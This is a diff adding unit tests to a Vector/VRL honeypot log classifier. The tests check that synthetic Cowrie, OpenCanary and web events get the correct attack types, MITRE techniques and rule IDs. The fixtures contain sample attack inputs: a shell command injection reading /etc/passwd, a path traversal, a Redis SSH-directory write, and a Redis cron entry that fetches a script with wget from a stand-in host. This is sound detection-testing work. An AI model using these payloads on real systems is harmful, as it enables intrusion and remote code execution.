@@ -248,7 +248,9 @@ tests:
               assert_eq!(.service, "redis")
               assert_eq!(.event_type, "command")
               assert_eq!(.command, "CONFIG SET dir /root/.ssh")
-              assert_eq!(.attack_type, "post_exploitation_command")
+              assert_eq!(.attack_type, "redis_command")
+              assert_eq!(.rule.id, "redis.command")
+              assert!(!exists(.mitre_technique))
 
   - name: opencanary_arranque_se_descarta
     inputs:
@@ -495,3 +497,229 @@ tests:
           - type: vrl
             source: |
               assert_eq!(.src_ip, "999.999.1.1")
+
+  # ===================================================== W03 · REGLA 1.1.0
+  # Hecho observado (event_type, service, command, file.*) frente a la
+  # interpretación ATT&CK (attack_type/mitre_*), que es anotación de regla
+  # versionada (rule.*). Solapamiento: precedencia contextual + rule.matches.
+  - name: regla_version_y_ruleset_en_cada_evento
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T11:00:00.000Z","event_id":"22222222-2222-4222-8222-222222222201","honeypot":"web","service":"http","event_type":"request","src_ip":"198.51.100.1","http":{"method":"GET","path":"/","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.rule.ruleset, "winnie-legacy")
+              assert_eq!(.rule.version, "1.2.0")
+              assert_eq!(.rule.matches, [])
+              assert!(!exists(.rule.id))
+              assert_eq!(.attack_type, "other")
+              assert!(!exists(.mitre_technique))
+
+  - name: solape_comando_web_con_ruta_sensible_gana_command_injection
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T11:00:01.000Z","event_id":"22222222-2222-4222-8222-222222222202","honeypot":"web","service":"http","event_type":"request","src_ip":"198.51.100.2","http":{"method":"GET","path":"/ping","query":"host=127.0.0.1%3Bcat%20/etc/passwd","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "command_injection")
+              assert_eq!(.mitre_technique, "T1059")
+              assert_eq!(.rule.id, "web.command_injection")
+              assert_eq!(.rule.matches, ["web.command_injection", "web.lfi_rfi"])
+
+  - name: solape_web_command_injection_con_etc_hosts_conserva_ambas_anotaciones
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T11:00:02.000Z","event_id":"22222222-2222-4222-8222-222222222203","honeypot":"web","service":"http","event_type":"request","src_ip":"198.51.100.3","http":{"method":"GET","path":"/ping","query":"host=127.0.0.1;cat /etc/hosts","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "command_injection")
+              assert_eq!(.rule.matches, ["web.command_injection", "web.lfi_rfi"])
+
+  - name: ruta_sensible_sin_comando_es_solo_lfi
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T11:00:03.000Z","event_id":"22222222-2222-4222-8222-222222222204","honeypot":"web","service":"http","event_type":"request","src_ip":"198.51.100.4","http":{"method":"GET","path":"/download","query":"file=../../etc/passwd","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "lfi_rfi")
+              assert_eq!(.mitre_technique, "T1190")
+              assert_eq!(.rule.id, "web.lfi_rfi")
+              assert_eq!(.rule.matches, ["web.lfi_rfi"])
+
+  - name: control_inocuo_ping_legitimo_es_other
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T11:00:04.000Z","event_id":"22222222-2222-4222-8222-222222222205","honeypot":"web","service":"http","event_type":"request","src_ip":"198.51.100.5","http":{"method":"GET","path":"/ping","query":"host=10.0.0.5","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "other")
+              assert_eq!(.rule.matches, [])
+              assert!(!exists(.mitre_technique))
+
+  - name: control_inocuo_busqueda_con_palabras_de_comando_y_rutas_es_other
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T11:00:05.000Z","event_id":"22222222-2222-4222-8222-222222222206","honeypot":"web","service":"http","event_type":"request","src_ip":"198.51.100.6","http":{"method":"GET","path":"/search","query":"q=cat food; rock and roll etc hosts","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "other")
+              assert_eq!(.rule.matches, [])
+
+  - name: hecho_login_e_interpretacion_separados
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"172.30.0.20","dst_port":21,"local_time":"2026-11-23 11:00:06.000000","logdata":{"USERNAME":"ftpuser","PASSWORD":"fixture-only"},"logtype":2000,"node_id":"hp-opencanary","src_host":"198.51.100.7","src_port":40001,"utc_time":"2026-11-23 11:00:06.000000"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.event_type, "auth_attempt")
+              assert_eq!(.service, "ftp")
+              assert_eq!(.rule.id, "auth.login_attempt")
+              assert_eq!(.attack_type, "brute_force")
+              assert_eq!(.mitre_technique, "T1110")
+
+  - name: hecho_comando_redis_conserva_semantica_de_servicio
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"172.30.0.20","dst_port":6379,"local_time":"2026-11-23 11:00:07.000000","logdata":{"CMD":"INFO","ARGS":""},"logtype":17001,"node_id":"hp-opencanary","src_host":"198.51.100.8","src_port":40002,"utc_time":"2026-11-23 11:00:07.000000"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "redis")
+              assert_eq!(.event_type, "command")
+              assert!(starts_with(string!(.command), "INFO"))
+              assert_eq!(.rule.id, "redis.command")
+              assert_eq!(.rule.matches, ["redis.command"])
+              assert_eq!(.attack_type, "redis_command")
+              assert!(!exists(.mitre_technique))
+
+  - name: hecho_transferencia_frente_a_interpretacion_malware
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.session.file_download","url":"http://203.0.113.9/fixture.sh","outfile":"var/lib/cowrie/downloads/cd34","shasum":"cd34cd34cd34cd34cd34cd34cd34cd34cd34cd34cd34cd34cd34cd34cd34cd34","message":"Downloaded URL","sensor":"hp-cowrie","timestamp":"2026-11-23T11:00:08.000000Z","src_ip":"198.51.100.9","session":"f1f2f3f4f5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.event_type, "file_download")
+              assert_eq!(.file.url, "http://203.0.113.9/fixture.sh")
+              assert_eq!(.rule.id, "file.download")
+              assert_eq!(.attack_type, "malware_download")
+              assert_eq!(.mitre_technique, "T1105")
+
+  - name: conexion_de_salud_del_sensor_no_es_recon
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.session.connect","src_ip":"127.0.0.1","src_port":40100,"dst_ip":"127.0.0.1","dst_port":2222,"session":"aaaabbbbcccc","protocol":"ssh","message":"New connection","sensor":"hp-cowrie","timestamp":"2026-11-23T11:00:09.000000Z"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.event_type, "connection")
+              assert_eq!(.src_ip, "127.0.0.1")
+              assert_eq!(.attack_type, "other")
+              assert!(!exists(.mitre_technique))
+              assert_eq!(.rule.id, "connection.sensor_health")
+
+  - name: conexion_externa_sigue_siendo_recon
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.session.connect","src_ip":"172.30.0.1","src_port":40101,"dst_ip":"172.30.0.10","dst_port":2222,"session":"ddddeeeeffff","protocol":"ssh","message":"New connection","sensor":"hp-cowrie","timestamp":"2026-11-23T11:00:10.000000Z"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "recon_scan")
+              assert_eq!(.mitre_technique, "T1595")
+              assert_eq!(.rule.id, "connection.unauthenticated")
+
+  - name: redis_con_url_sigue_siendo_comando_redis
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"172.30.0.20","dst_port":6379,"local_time":"2026-11-23 11:00:11.000000","logdata":{"CMD":"SET","ARGS":"x */1 * * * * wget http://203.0.113.9/x.sh"},"logtype":17001,"node_id":"hp-opencanary","src_host":"198.51.100.10","src_port":40003,"utc_time":"2026-11-23 11:00:11.000000"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "redis")
+              assert_eq!(.attack_type, "redis_command")
+              assert!(!exists(.mitre_technique))
+
+  - name: comando_cowrie_sigue_siendo_post_exploitation
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.command.input","input":"uname -a","message":"CMD: uname -a","sensor":"hp-cowrie","timestamp":"2026-11-23T11:00:12.000000Z","src_ip":"198.51.100.11","session":"abcdef012345"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "ssh")
+              assert_eq!(.attack_type, "post_exploitation_command")
+              assert_eq!(.mitre_technique, "T1059.004")
+              assert_eq!(.rule.id, "command.after_login")
